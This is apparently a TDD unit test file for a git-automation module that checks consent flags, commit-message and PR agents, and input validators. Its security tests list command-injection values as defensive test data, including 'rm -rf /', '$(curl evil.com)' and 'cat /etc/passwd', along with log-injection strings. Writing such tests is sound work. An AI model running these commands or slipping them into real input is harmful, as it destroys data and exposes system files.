"""
Unit tests for auto_implement_git_integration module.

TDD Mode: These tests are written BEFORE implementation.
All tests should FAIL initially (ImportError: module not found).

Test Strategy:
- Test each function in isolation
- Mock all external dependencies
- Test edge cases and error conditions
- Achieve 90%+ code coverage
- Focus on consent management, agent invocation, error handling

Date: 2025-11-05
Workflow: git_automation
Agent: test-master
Phase: TDD Red (tests written BEFORE implementation)
"""

import json
import os
import sys
import pytest
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock, call, ANY
from subprocess import CalledProcessError, TimeoutExpired
from typing import Dict, Any

# Add lib directory to path for imports
sys.path.insert(
    0,
    str(
        Path(__file__).parent.parent.parent
        / "plugins"
        / "autonomous-dev"
        / "lib"
    ),
)

# Import will fail - module doesn't exist yet (TDD!)
try:
    from auto_implement_git_integration import (
        check_consent_via_env,
        parse_consent_value,
        invoke_commit_message_agent,
        invoke_pr_description_agent,
        validate_agent_output,
        build_manual_git_instructions,
        build_fallback_pr_command,
        check_git_available,
        check_gh_available,
        format_error_message,
    )
except ImportError as e:
    pytest.skip(f"Implementation not found (TDD red phase): {e}", allow_module_level=True)


class TestConsentParsing:
    """Test consent value parsing from environment variables."""

    def test_parse_consent_true_lowercase(self):
        """Test parsing 'true' returns True."""
        assert parse_consent_value('true') is True

    def test_parse_consent_true_uppercase(self):
        """Test parsing 'TRUE' returns True."""
        assert parse_consent_value('TRUE') is True

    def test_parse_consent_true_mixed_case(self):
        """Test parsing 'True' returns True."""
        assert parse_consent_value('True') is True

    def test_parse_consent_yes_lowercase(self):
        """Test parsing 'yes' returns True."""
        assert parse_consent_value('yes') is True

    def test_parse_consent_yes_uppercase(self):
        """Test parsing 'YES' returns True."""
        assert parse_consent_value('YES') is True

    def test_parse_consent_one(self):
        """Test parsing '1' returns True."""
        assert parse_consent_value('1') is True

    def test_parse_consent_y(self):
        """Test parsing 'y' returns True."""
        assert parse_consent_value('y') is True

    def test_parse_consent_false_lowercase(self):
        """Test parsing 'false' returns False."""
        assert parse_consent_value('false') is False

    def test_parse_consent_no_lowercase(self):
        """Test parsing 'no' returns False."""
        assert parse_consent_value('no') is False

    def test_parse_consent_zero(self):
        """Test parsing '0' returns False."""
        assert parse_consent_value('0') is False

    def test_parse_consent_empty_string(self):
        """Test parsing empty string returns False."""
        assert parse_consent_value('') is False

    def test_parse_consent_none(self):
        """Test parsing None returns False."""
        assert parse_consent_value(None) is False

    def test_parse_consent_invalid_value(self):
        """Test parsing invalid value returns False."""
        assert parse_consent_value('invalid') is False

    def test_parse_consent_whitespace(self):
        """Test parsing whitespace-only string returns False."""
        assert parse_consent_value('   ') is False

    def test_parse_consent_strips_whitespace(self):
        """Test parsing strips whitespace before checking."""
        assert parse_consent_value('  true  ') is True
        assert parse_consent_value('  false  ') is False


class TestConsentChecking:
    """Test checking consent from environment variables."""

    @patch.dict(os.environ, {'AUTO_GIT_ENABLED': 'true', 'AUTO_GIT_PUSH': 'true', 'AUTO_GIT_PR': 'true'})
    def test_check_consent_all_enabled(self):
        """Test all consent flags enabled."""
        consent = check_consent_via_env()

        assert consent['git_enabled'] is True
        assert consent['push_enabled'] is True
        assert consent['pr_enabled'] is True
        assert consent['all_enabled'] is True

    @patch.dict(os.environ, {'AUTO_GIT_ENABLED': 'false'}, clear=True)
    def test_check_consent_all_disabled(self):
        """Test all consent flags disabled when git disabled."""
        consent = check_consent_via_env()

        assert consent['git_enabled'] is False
        assert consent['push_enabled'] is False
        assert consent['pr_enabled'] is False
        assert consent['all_enabled'] is False

    @patch.dict(os.environ, {'AUTO_GIT_ENABLED': 'true', 'AUTO_GIT_PUSH': 'false'}, clear=True)
    def test_check_consent_partial(self):
        """Test partial consent (commit but no push)."""
        consent = check_consent_via_env()

        assert consent['git_enabled'] is True
        assert consent['push_enabled'] is False
        assert consent['pr_enabled'] is False
        assert consent['all_enabled'] is False

    @patch.dict(os.environ, {'AUTO_GIT_ENABLED': 'true', 'AUTO_GIT_PUSH': 'true', 'AUTO_GIT_PR': 'false'}, clear=True)
    def test_check_consent_no_pr(self):
        """Test consent for commit+push but no PR."""
        consent = check_consent_via_env()

        assert consent['git_enabled'] is True
        assert consent['push_enabled'] is True
        assert consent['pr_enabled'] is False
        assert consent['all_enabled'] is False

    @patch.dict(os.environ, {}, clear=True)
    def test_check_consent_no_env_vars(self):
        """Test defaults to disabled when no env vars set."""
        consent = check_consent_via_env()

        assert consent['git_enabled'] is False
        assert consent['push_enabled'] is False
        assert consent['pr_enabled'] is False
        assert consent['all_enabled'] is False

    @patch.dict(os.environ, {'AUTO_GIT_ENABLED': 'yes', 'AUTO_GIT_PUSH': '1', 'AUTO_GIT_PR': 'YES'})
    def test_check_consent_various_truthy_values(self):
        """Test accepts various truthy values."""
        consent = check_consent_via_env()

        assert consent['git_enabled'] is True
        assert consent['push_enabled'] is True
        assert consent['pr_enabled'] is True

    @patch.dict(os.environ, {'AUTO_GIT_ENABLED': 'true', 'AUTO_GIT_PUSH': 'true'}, clear=True)
    def test_check_consent_pr_disabled_when_not_set(self):
        """Test PR defaults to disabled when env var not set."""
        consent = check_consent_via_env()

        assert consent['git_enabled'] is True
        assert consent['push_enabled'] is True
        assert consent['pr_enabled'] is False


class TestAgentInvocation:
    """Test invoking commit-message-generator and pr-description-generator agents."""

    @patch('auto_implement_git_integration.AgentInvoker')
    @patch('auto_implement_git_integration.ArtifactManager')
    def test_invoke_commit_message_agent_success(self, mock_artifact_mgr, mock_agent_invoker):
        """Test successful commit message agent invocation."""
        # Arrange
        mock_invoker_instance = MagicMock()
        mock_agent_invoker.return_value = mock_invoker_instance

        mock_invoker_instance.invoke.return_value = {
            'success': True,
            'output': 'feat: add user authentication\n\nImplemented JWT-based auth',
            'error': ''
        }

        # Act
        result = invoke_commit_message_agent(
            workflow_id='test-workflow-123',
            request='Add user authentication'
        )

        # Assert
        assert result['success'] is True
        assert result['output'] == 'feat: add user authentication\n\nImplemented JWT-based auth'
        assert result['error'] == ''

    @patch('auto_implement_git_integration.AgentInvoker')
    @patch('auto_implement_git_integration.ArtifactManager')
    def test_invoke_commit_message_agent_timeout(self, mock_artifact_mgr, mock_agent_invoker):
        """Test commit message agent timeout handling."""
        # Arrange
        mock_invoker_instance = MagicMock()
        mock_agent_invoker.return_value = mock_invoker_instance

        mock_invoker_instance.invoke.side_effect = TimeoutError('Agent timeout')

        # Act
        result = invoke_commit_message_agent(
            workflow_id='test-workflow-123',
            request='Add feature'
        )

        # Assert
        assert result['success'] is False
        assert 'timeout' in result['error'].lower()
        assert result['output'] == ''

    @patch('auto_implement_git_integration.AgentInvoker')
    @patch('auto_implement_git_integration.ArtifactManager')
    def test_invoke_commit_message_agent_missing_artifacts(self, mock_artifact_mgr, mock_agent_invoker):
        """Test commit message agent handles missing artifacts."""
        # Arrange
        mock_artifact_mgr_instance = MagicMock()
        mock_artifact_mgr.return_value = mock_artifact_mgr_instance

        mock_artifact_mgr_instance.read_artifact.side_effect = FileNotFoundError('manifest.json not found')

        # Act
        result = invoke_commit_message_agent(
            workflow_id='test-workflow-123',
            request='Add feature'
        )

        # Assert
        assert result['success'] is False
        assert 'manifest' in result['error'].lower()
        assert 'not found' in result['error'].lower()

    @patch('auto_implement_git_integration.AgentInvoker')
    @patch('auto_implement_git_integration.ArtifactManager')
    def test_invoke_pr_description_agent_success(self, mock_artifact_mgr, mock_agent_invoker):
        """Test successful PR description agent invocation."""
        # Arrange
        mock_invoker_instance = MagicMock()
        mock_agent_invoker.return_value = mock_invoker_instance

        mock_invoker_instance.invoke.return_value = {
            'success': True,
            'output': '## Summary\n- Added feature\n\n## Test Plan\n- [x] Tests pass',
            'error': ''
        }

        # Act
        result = invoke_pr_description_agent(
            workflow_id='test-workflow-123',
            branch='feature/add-feature'
        )

        # Assert
        assert result['success'] is True
        assert '## Summary' in result['output']
        assert result['error'] == ''

    @patch('auto_implement_git_integration.AgentInvoker')
    @patch('auto_implement_git_integration.ArtifactManager')
    def test_invoke_pr_description_agent_failure(self, mock_artifact_mgr, mock_agent_invoker):
        """Test PR description agent failure handling."""
        # Arrange
        mock_invoker_instance = MagicMock()
        mock_agent_invoker.return_value = mock_invoker_instance

        mock_invoker_instance.invoke.return_value = {
            'success': False,
            'output': '',
            'error': 'Agent failed to generate description'
        }

        # Act
        result = invoke_pr_description_agent(
            workflow_id='test-workflow-123',
            branch='feature/add-feature'
        )

        # Assert
        assert result['success'] is False
        assert 'failed to generate' in result['error'].lower()

    @patch('auto_implement_git_integration.AgentInvoker')
    @patch('auto_implement_git_integration.ArtifactManager')
    def test_invoke_agent_passes_correct_context(self, mock_artifact_mgr, mock_agent_invoker):
        """Test agent invocation passes correct context parameters."""
        # Arrange
        mock_invoker_instance = MagicMock()
        mock_agent_invoker.return_value = mock_invoker_instance

        mock_invoker_instance.invoke.return_value = {
            'success': True,
            'output': 'feat: add feature',
            'error': ''
        }

        # Act
        invoke_commit_message_agent(
            workflow_id='test-workflow-123',
            request='Add user authentication',
            staged_files=['auth.py', 'tests/test_auth.py']
        )

        # Assert
        mock_invoker_instance.invoke.assert_called_once_with(
            'commit-message-generator',
            'test-workflow-123',
            request='Add user authentication',
            staged_files=['auth.py', 'tests/test_auth.py']
        )


class TestAgentOutputValidation:
    """Test validation of agent output."""

    def test_validate_agent_output_success(self):
        """Test valid agent output passes validation."""
        agent_result = {
            'success': True,
            'output': 'feat: add feature\n\nImplemented feature',
            'error': ''
        }

        is_valid, error = validate_agent_output(agent_result, 'commit-message-generator')

        assert is_valid is True
        assert error == ''

    def test_validate_agent_output_failure(self):
        """Test failed agent output fails validation."""
        agent_result = {
            'success': False,
            'output': '',
            'error': 'Agent timeout'
        }

        is_valid, error = validate_agent_output(agent_result, 'commit-message-generator')

        assert is_valid is False
        assert 'timeout' in error.lower()

    def test_validate_agent_output_empty_output(self):
        """Test empty output fails validation."""
        agent_result = {
            'success': True,
            'output': '',
            'error': ''
        }

        is_valid, error = validate_agent_output(agent_result, 'commit-message-generator')

        assert is_valid is False
        assert 'empty output' in error.lower() or 'no output' in error.lower()

    def test_validate_agent_output_whitespace_only(self):
        """Test whitespace-only output fails validation."""
        agent_result = {
            'success': True,
            'output': '   \n\n   ',
            'error': ''
        }

        is_valid, error = validate_agent_output(agent_result, 'commit-message-generator')

        assert is_valid is False
        assert 'empty' in error.lower() or 'whitespace' in error.lower()

    def test_validate_agent_output_missing_success_key(self):
        """Test missing success key fails validation."""
        agent_result = {
            'output': 'feat: add feature',
            'error': ''
        }

        is_valid, error = validate_agent_output(agent_result, 'commit-message-generator')

        assert is_valid is False
        assert 'invalid format' in error.lower() or 'missing' in error.lower()

    def test_validate_agent_output_includes_agent_name(self):
        """Test validation error includes agent name."""
        agent_result = {
            'success': False,
            'output': '',
            'error': 'Failed'
        }

        is_valid, error = validate_agent_output(agent_result, 'pr-description-generator')

        assert is_valid is False
        assert 'pr-description-generator' in error


class TestManualInstructionsBuilder:
    """Test building manual git instructions."""

    def test_build_manual_git_instructions_basic(self):
        """Test basic manual instructions."""
        instructions = build_manual_git_instructions(
            branch='main',
            commit_message='feat: add feature'
        )

        assert 'git add' in instructions
        assert 'git commit' in instructions
        assert 'feat: add feature' in instructions

    def test_build_manual_git_instructions_with_push(self):
        """Test manual instructions include push."""
        instructions = build_manual_git_instructions(
            branch='feature/add-auth',
            commit_message='feat: add auth',
            include_push=True
        )

        assert 'git push' in instructions
        assert 'feature/add-auth' in instructions

    def test_build_manual_git_instructions_multiline_commit_message(self):
        """Test manual instructions handle multiline commit messages."""
        commit_msg = 'feat: add feature\n\nImplemented user authentication\nwith JWT tokens'

        instructions = build_manual_git_instructions(
            branch='main',
            commit_message=commit_msg
        )

        assert 'git commit' in instructions
        # Should use heredoc or -m with proper escaping
        assert 'feat: add feature' in instructions

    def test_build_manual_git_instructions_escapes_special_characters(self):
        """Test manual instructions escape special characters in commit message."""
        commit_msg = 'feat: add "quotes" and $variables'

        instructions = build_manual_git_instructions(
            branch='main',
            commit_message=commit_msg
        )

        assert 'git commit' in instructions
        # Should properly escape quotes and variables

    def test_build_manual_git_instructions_readable_format(self):
        """Test manual instructions are in readable format."""
        instructions = build_manual_git_instructions(
            branch='main',
            commit_message='feat: add feature'
        )

        # Should be numbered or bulleted
        assert any(char in instructions for char in ['1.', '2.', '-', '*'])


class TestFallbackPRCommand:
    """Test building fallback PR command."""

    def test_build_fallback_pr_command_basic(self):
        """Test basic fallback PR command."""
        command = build_fallback_pr_command(
            branch='feature/add-auth',
            base_branch='main',
            title='feat: add user authentication'
        )

        assert command.startswith('gh pr create')
        assert '--title "feat: add user authentication"' in command
        assert '--base main' in command
        assert '--head feature/add-auth' in command

    def test_build_fallback_pr_command_with_body(self):
        """Test fallback PR command with body."""
        command = build_fallback_pr_command(
            branch='feature/add-auth',
            base_branch='main',
            title='feat: add auth',
            body='## Summary\n- Added auth'
        )

        assert '--body' in command or '--body-file' in command

    def test_build_fallback_pr_command_escapes_quotes(self):
        """Test fallback PR command escapes quotes in title."""
        command = build_fallback_pr_command(
            branch='feature/add',
            base_branch='main',
            title='feat: add "feature" with quotes'
        )

        assert 'gh pr create' in command
        # Should properly escape quotes

    def test_build_fallback_pr_command_with_draft(self):
        """Test fallback PR command supports draft PR."""
        command = build_fallback_pr_command(
            branch='feature/add-auth',
            base_branch='main',
            title='feat: add auth',
            draft=True
        )

        assert '--draft' in command

    def test_build_fallback_pr_command_readable(self):
        """Test fallback PR command is readable and copyable."""
        command = build_fallback_pr_command(
            branch='feature/add-auth',
            base_branch='main',
            title='feat: add auth'
        )

        # Should be single line or clearly formatted
        assert 'gh pr create' in command
        assert len(command.split('\n')) <= 3  # Max 3 lines for readability


class TestGitAvailability:
    """Test checking git and gh CLI availability."""

    @patch('subprocess.run')
    def test_check_git_available_success(self, mock_run):
        """Test git CLI is available."""
        mock_run.return_value = Mock(returncode=0, stdout='git version 2.40.0\n')

        is_available = check_git_available()

        assert is_available is True

    @patch('subprocess.run')
    def test_check_git_available_not_found(self, mock_run):
        """Test git CLI is not available."""
        mock_run.side_effect = FileNotFoundError('git not found')

        is_available = check_git_available()

        assert is_available is False

    @patch('subprocess.run')
    def test_check_git_available_command_fails(self, mock_run):
        """Test git command fails."""
        mock_run.side_effect = CalledProcessError(1, ['git', '--version'])

        is_available = check_git_available()

        assert is_available is False

    @patch('subprocess.run')
    def test_check_gh_available_success(self, mock_run):
        """Test gh CLI is available."""
        mock_run.return_value = Mock(returncode=0, stdout='gh version 2.40.0\n')

        is_available = check_gh_available()

        assert is_available is True

    @patch('subprocess.run')
    def test_check_gh_available_not_found(self, mock_run):
        """Test gh CLI is not available."""
        mock_run.side_effect = FileNotFoundError('gh not found')

        is_available = check_gh_available()

        assert is_available is False

    @patch('subprocess.run')
    def test_check_gh_available_not_authenticated(self, mock_run):
        """Test gh CLI not authenticated returns False."""
        # gh --version succeeds
        mock_run.return_value = Mock(returncode=0, stdout='gh version 2.40.0\n')

        # But we should also check auth status
        is_available = check_gh_available(check_auth=True)

        # Implementation should check gh auth status


class TestErrorFormatting:
    """Test error message formatting."""

    def test_format_error_message_basic(self):
        """Test basic error message formatting."""
        error = format_error_message(
            stage='commit-message-generator',
            error='Agent timeout'
        )

        assert 'commit-message-generator' in error
        assert 'Agent timeout' in error

    def test_format_error_message_with_next_steps(self):
        """Test error message includes next steps."""
        error = format_error_message(
            stage='git_operations',
            error='Not a git repository',
            next_steps=['Initialize git repo: git init', 'Add remote: git remote add origin <url>']
        )

        assert 'git_operations' in error
        assert 'Not a git repository' in error
        assert 'git init' in error
        assert 'git remote add' in error

    def test_format_error_message_with_context(self):
        """Test error message includes context."""
        error = format_error_message(
            stage='pr_creation',
            error='gh not authenticated',
            context={
                'branch': 'feature/add-auth',
                'commit_sha': 'abc1234'
            }
        )

        assert 'pr_creation' in error
        assert 'gh not authenticated' in error
        assert 'feature/add-auth' in error
        assert 'abc1234' in error

    def test_format_error_message_readable(self):
        """Test error message is readable and structured."""
        error = format_error_message(
            stage='test_stage',
            error='Test error',
            next_steps=['Step 1', 'Step 2']
        )

        # Should have clear sections
        assert 'error' in error.lower() or 'failed' in error.lower()
        # Should have readable structure (newlines, bullets, etc.)

    def test_format_error_message_includes_helpful_links(self):
        """Test error message includes helpful documentation links."""
        error = format_error_message(
            stage='git_operations',
            error='Not a git repository',
            include_docs_link=True
        )

        # Should include link to git setup docs
        assert 'http' in error or 'docs' in error.lower()


class TestEdgeCases:
    """Test edge cases and boundary conditions."""

    def test_empty_workflow_id(self):
        """Test handling empty workflow ID."""
        with pytest.raises(ValueError, match='workflow_id cannot be empty'):
            invoke_commit_message_agent(workflow_id='', request='Add feature')

    def test_empty_request(self):
        """Test handling empty request."""
        with pytest.raises(ValueError, match='request cannot be empty'):
            invoke_commit_message_agent(workflow_id='test-123', request='')

    def test_empty_branch_name(self):
        """Test handling empty branch name."""
        with pytest.raises(ValueError, match='branch cannot be empty'):
            invoke_pr_description_agent(workflow_id='test-123', branch='')

    def test_none_workflow_id(self):
        """Test handling None workflow ID."""
        with pytest.raises(ValueError):
            invoke_commit_message_agent(workflow_id=None, request='Add feature')

    def test_whitespace_only_inputs(self):
        """Test handling whitespace-only inputs."""
        with pytest.raises(ValueError):
            invoke_commit_message_agent(workflow_id='   ', request='Add feature')

    @patch('auto_implement_git_integration.AgentInvoker')
    @patch('auto_implement_git_integration.ArtifactManager')
    def test_very_long_request(self, mock_artifact_mgr, mock_agent_invoker):
        """Test handling very long request strings."""
        # Arrange
        mock_invoker_instance = MagicMock()
        mock_agent_invoker.return_value = mock_invoker_instance

        mock_invoker_instance.invoke.return_value = {
            'success': True,
            'output': 'feat: add feature',
            'error': ''
        }

        long_request = 'Add feature ' * 1000  # Very long request

        # Act
        result = invoke_commit_message_agent(
            workflow_id='test-123',
            request=long_request
        )

        # Assert: Should handle without crashing
        assert result['success'] is True

    def test_special_characters_in_branch_name(self):
        """Test handling special characters in branch name."""
        # Should handle slashes, dashes, underscores
        command = build_fallback_pr_command(
            branch='feature/add-auth_v2',
            base_branch='main',
            title='feat: add auth'
        )

        assert 'feature/add-auth_v2' in command

    def test_unicode_in_commit_message(self):
        """Test handling unicode characters in commit message."""
        instructions = build_manual_git_instructions(
            branch='main',
            commit_message='feat: add 中文 support'
        )

        assert '中文' in instructions or 'feat: add' in instructions


class TestSecurityValidation:
    """Test NEW security validation functions (TDD red phase).

    These tests are for NEW functions that don't exist yet:
    - validate_git_state()
    - validate_branch_name()
    - validate_commit_message()
    - check_git_credentials()

    All tests should FAIL initially (ImportError or function not found).

    Security Coverage:
    - CWE-78: Command Injection (branch names, commit messages)
    - CWE-22: Path Traversal (session files)
    - CWE-117: Log Injection (audit logs)
    - CWE-732: Incorrect Permissions (git directories)
    """

    def test_validate_git_state_detached_head(self):
        """Should reject git operations when in detached HEAD state."""
        with patch('subprocess.run') as mock_run:
            # Simulate detached HEAD
            mock_run.return_value = Mock(
                returncode=0,
                stdout='HEAD detached at abc1234',
            )

            from auto_implement_git_integration import validate_git_state

            with pytest.raises(ValueError, match='detached HEAD'):
                validate_git_state()

    def test_validate_git_state_protected_branch(self):
        """Should reject git operations on protected branches (main, master)."""
        with patch('subprocess.run') as mock_run:
            # Simulate on main branch
            mock_run.return_value = Mock(returncode=0, stdout='main')

            from auto_implement_git_integration import validate_git_state

            with pytest.raises(ValueError, match='protected branch'):
                validate_git_state()

    def test_validate_git_state_not_a_repo(self):
        """Should raise error when not in a git repository."""
        with patch('subprocess.run') as mock_run:
            # Simulate not a git repo
            mock_run.side_effect = CalledProcessError(128, 'git')

            from auto_implement_git_integration import validate_git_state

            with pytest.raises(ValueError, match='not a git repository'):
                validate_git_state()

    def test_validate_git_state_uncommitted_changes(self):
        """Should allow uncommitted changes (they'll be committed)."""
        with patch('subprocess.run') as mock_run:
            # Simulate uncommitted changes
            mock_run.side_effect = [
                Mock(returncode=0, stdout='feature/add-auth'),  # branch name
                Mock(returncode=0, stdout=' M file1.py\n M file2.py'),  # git status
            ]

            from auto_implement_git_integration import validate_git_state

            # Should not raise (uncommitted changes are OK)
            result = validate_git_state()
            assert result is True

    def test_validate_branch_name_command_injection(self):
        """Should reject branch names with command injection attempts (CWE-78)."""
        from auto_implement_git_integration import validate_branch_name

        dangerous_names = [
            'feature; rm -rf /',
            'feature$(curl evil.com)',
            'feature`whoami`',
            'feature|cat /etc/passwd',
            'feature&& rm important.txt',
        ]

        for name in dangerous_names:
            with pytest.raises(ValueError, match='Invalid branch name'):
                validate_branch_name(name)

    def test_validate_branch_name_length_limit(self):
        """Should reject branch names exceeding 255 characters."""
        from auto_implement_git_integration import validate_branch_name

        long_name = 'feature/' + 'a' * 300

        with pytest.raises(ValueError, match='Branch name too long'):
            validate_branch_name(long_name)

    def test_validate_branch_name_valid_names(self):
        """Should accept valid branch names."""
        from auto_implement_git_integration import validate_branch_name

        valid_names = [
            'feature/add-auth',
            'bugfix/issue-123',
            'release/v1.2.3',
            'feat/user-login_v2',
        ]

        for name in valid_names:
            # Should not raise
            result = validate_branch_name(name)
            assert result == name  # Returns sanitized name

    def test_validate_branch_name_shell_metacharacters(self):
        """Should reject shell metacharacters in branch names (CWE-78)."""
        from auto_implement_git_integration import validate_branch_name

        dangerous_chars = ['$', '`', '|', '&', ';', '>', '<', '(', ')', '{', '}']

        for char in dangerous_chars:
            name = f'feature{char}test'
            with pytest.raises(ValueError, match='Invalid characters'):
                validate_branch_name(name)

    def test_validate_commit_message_command_injection(self):
        """Should reject commit messages with command injection attempts (CWE-78)."""
        from auto_implement_git_integration import validate_commit_message

        dangerous_messages = [
            'feat: add auth\n$(curl evil.com)',
            'feat: add auth`whoami`',
            'feat: add auth; rm -rf /',
        ]

        for msg in dangerous_messages:
            with pytest.raises(ValueError, match='Invalid commit message'):
                validate_commit_message(msg)

    def test_validate_commit_message_log_injection(self):
        """Should reject log injection attempts in commit messages (CWE-117)."""
        from auto_implement_git_integration import validate_commit_message

        injection_attempts = [
            'feat: add auth\n\nINFO: Fake log entry',
            'feat: add auth\x00null byte injection',
            'feat: add auth\r\nERROR: Fake error',
        ]

        for msg in injection_attempts:
            with pytest.raises(ValueError, match='Invalid commit message'):
                validate_commit_message(msg)

    def test_validate_commit_message_length_limit(self):
        """Should reject commit messages exceeding reasonable length."""
        from auto_implement_git_integration import validate_commit_message

        long_message = 'feat: ' + 'a' * 10000

        with pytest.raises(ValueError, match='Commit message too long'):
            validate_commit_message(long_message)

    def test_validate_commit_message_valid_messages(self):
        """Should accept valid conventional commit messages."""
        from auto_implement_git_integration import validate_commit_message

        valid_messages = [
            'feat: add user authentication',
            'fix: resolve login bug\n\nDetailed explanation here.',
            'docs: update README',
            'refactor: simplify auth logic',
        ]

        for msg in valid_messages:
            # Should not raise
            result = validate_commit_message(msg)
            assert result == msg  # Returns sanitized message

    def test_check_git_credentials_missing_config(self):
        """Should detect missing git config (user.name, user.email)."""
        with patch('subprocess.run') as mock_run:
            # Simulate missing git config
            mock_run.return_value = Mock(returncode=1, stdout='')

            from auto_implement_git_integration import check_git_credentials

            with pytest.raises(ValueError, match='Git user.name not configured'):
                check_git_credentials()

    def test_check_git_credentials_gh_not_authenticated(self):
        """Should detect when gh CLI is not authenticated."""
        with patch('subprocess.run') as mock_run:
            # Simulate gh not authenticated
            mock_run.side_effect = [
                Mock(returncode=0, stdout='John Doe'),  # git user.name
                Mock(returncode=0, stdout='john@example.com'),  # git user.email
                Mock(returncode=1, stderr='Not logged in'),  # gh auth status
            ]

            from auto_implement_git_integration import check_git_credentials

            with pytest.raises(ValueError, match='gh CLI not authenticated'):
                check_git_credentials()

    def test_check_git_credentials_success(self):
        """Should pass when git and gh are properly configured."""
        with patch('subprocess.run') as mock_run:
            # Simulate properly configured environment
            mock_run.side_effect = [
                Mock(returncode=0, stdout='John Doe'),  # git user.name
                Mock(returncode=0, stdout='john@example.com'),  # git user.email
                Mock(returncode=0, stdout='Logged in to github.com'),  # gh auth
            ]

            from auto_implement_git_integration import check_git_credentials

            # Should not raise
            result = check_git_credentials()
            assert result is True

    def test_check_git_credentials_optional_gh(self):
        """Should allow missing gh CLI if PR creation not requested."""
        with patch('subprocess.run') as mock_run:
            # Simulate git configured but gh not available
            mock_run.side_effect = [
                Mock(returncode=0, stdout='John Doe'),  # git user.name
                Mock(returncode=0, stdout='john@example.com'),  # git user.email
                FileNotFoundError('gh command not found'),  # gh not installed
            ]

            from auto_implement_git_integration import check_git_credentials

            # Should not raise if require_gh=False
            result = check_git_credentials(require_gh=False)
            assert result is True

    @patch('auto_implement_git_integration.security_utils.audit_log')
    def test_security_validation_audit_logging(self, mock_audit):
        """Should log security validation attempts to audit log."""
        from auto_implement_git_integration import validate_branch_name

        try:
            validate_branch_name('feature; rm -rf /')
        except ValueError:
            pass

        # Should log command injection attempt
        mock_audit.assert_called()
        call_args = mock_audit.call_args[0]
        assert 'command_injection_attempt' in call_args or 'security_validation_failed' in call_args

    def test_validate_git_state_uses_security_utils(self):
        """Should use security_utils for path validation."""
        with patch('auto_implement_git_integration.security_utils.validate_path') as mock_validate:
            with patch('subprocess.run') as mock_run:
                mock_run.return_value = Mock(returncode=0, stdout='feature/test')

                from auto_implement_git_integration import validate_git_state

                validate_git_state()

                # Should validate git directory paths
                # (implementation detail - may or may not call depending on design)
                # This test documents the expected integration

    def test_validate_branch_name_max_length_constant(self):
        """Should use a defined constant for max branch name length."""
        from auto_implement_git_integration import validate_branch_name

        # Test boundary condition: exactly at limit should pass
        name_at_limit = 'feature/' + 'a' * 240  # 248 chars total
        result = validate_branch_name(name_at_limit)
        assert result == name_at_limit

        # One over limit should fail
        name_over_limit = name_at_limit + 'x'
        with pytest.raises(ValueError, match='too long'):
            validate_branch_name(name_over_limit)

    def test_validate_commit_message_newline_handling(self):
        """Should properly handle newlines in commit messages."""
        from auto_implement_git_integration import validate_commit_message

        # Valid multi-line message (conventional commits format)
        valid_multiline = (
            'feat: add user authentication\n'
            '\n'
            'Implement JWT-based authentication with refresh tokens.\n'
            '\n'
            'Fixes #123'
        )

        # Should not raise
        result = validate_commit_message(valid_multiline)
        assert result == valid_multiline

    def test_validate_git_state_merge_in_progress(self):
        """Should detect and reject when merge is in progress."""
        with patch('subprocess.run') as mock_run:
            # Simulate merge in progress
            mock_run.side_effect = [
                Mock(returncode=0, stdout='feature/test'),  # branch name
                Mock(returncode=0, stdout='UU conflicted.py'),  # merge conflict
            ]
            with patch('pathlib.Path.exists', return_value=True):  # .git/MERGE_HEAD exists
                from auto_implement_git_integration import validate_git_state

                with pytest.raises(ValueError, match='merge in progress'):
                    validate_git_state()

    def test_validate_git_state_rebase_in_progress(self):
        """Should detect and reject when rebase is in progress."""
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout='feature/test')
            with patch('pathlib.Path.exists', return_value=True):  # .git/rebase-merge exists
                from auto_implement_git_integration import validate_git_state

                with pytest.raises(ValueError, match='rebase in progress'):
                    validate_git_state()

    def test_check_git_credentials_ssh_vs_https(self):
        """Should handle both SSH and HTTPS remote URLs."""
        with patch('subprocess.run') as mock_run:
            # Simulate SSH remote
            mock_run.side_effect = [
                Mock(returncode=0, stdout='John Doe'),
                Mock(returncode=0, stdout='john@example.com'),
                Mock(returncode=0, stdout='git@github.com:user/repo.git'),  # remote URL
                Mock(returncode=0, stdout='Logged in'),  # gh auth
            ]

            from auto_implement_git_integration import check_git_credentials

            # Should not raise
            result = check_git_credentials()
            assert result is True


# =============================================================================
# Integration Tests for Core Functions (Issue #270)
# Coverage target: 60%+ for auto_implement_git_integration.py
# =============================================================================


class TestCreateCommitWithAgentMessage:
    """Tests for create_commit_with_agent_message() function.

    This function:
    - Invokes commit-message-generator agent
    - Stages and commits files
    - Returns commit SHA
    """

    @patch('auto_implement_git_integration.invoke_commit_message_agent')
    @patch('auto_implement_git_integration.subprocess.run')
    def test_create_commit_success(self, mock_run, mock_agent):
        """Test successful commit creation with agent message."""
        try:
            from auto_implement_git_integration import create_commit_with_agent_message
        except ImportError:
            pytest.skip("create_commit_with_agent_message not yet implemented")

        # Arrange
        mock_agent.return_value = {
            'success': True,
            'output': 'feat: add user authentication\n\nImplement JWT-based auth',
            'error': ''
        }
        mock_run.return_value = Mock(returncode=0, stdout='abc123def')

        # Act
        result = create_commit_with_agent_message(
            workflow_id='test-123',
            files=['src/auth.py'],
            request='Add user authentication'
        )

        # Assert
        assert result['success'] is True
        assert 'commit_sha' in result
        mock_agent.assert_called_once()

    @patch('auto_implement_git_integration.invoke_commit_message_agent')
    def test_create_commit_agent_failure_fallback(self, mock_agent):
        """Test fallback when agent fails to generate message."""
        try:
            from auto_implement_git_integration import create_commit_with_agent_message
        except ImportError:
            pytest.skip("create_commit_with_agent_message not yet implemented")

        mock_agent.return_value = {
            'success': False,
            'output': '',
            'error': 'Agent timeout'
        }

        with patch('auto_implement_git_integration.subprocess.run') as mock_run:
            mock_run.return_value = Mock(returncode=0, stdout='abc123')

            result = create_commit_with_agent_message(
                workflow_id='test-123',
                files=['src/auth.py'],
                request='Add auth',
                fallback_message='feat: auto-generated commit'
            )

            # Should use fallback message
            assert result['success'] is True
            assert result.get('used_fallback') is True

    @patch('auto_implement_git_integration.invoke_commit_message_agent')
    @patch('auto_implement_git_integration.subprocess.run')
    def test_create_commit_git_failure(self, mock_run, mock_agent):
        """Test handling of git commit failure."""
        try:
            from auto_implement_git_integration import create_commit_with_agent_message
        except ImportError:
            pytest.skip("create_commit_with_agent_message not yet implemented")

        mock_agent.return_value = {
            'success': True,
            'output': 'feat: test commit',
            'error': ''
        }
        mock_run.side_effect = CalledProcessError(1, 'git commit', stderr='error')

        result = create_commit_with_agent_message(
            workflow_id='test-123',
            files=['src/auth.py'],
            request='Add auth'
        )
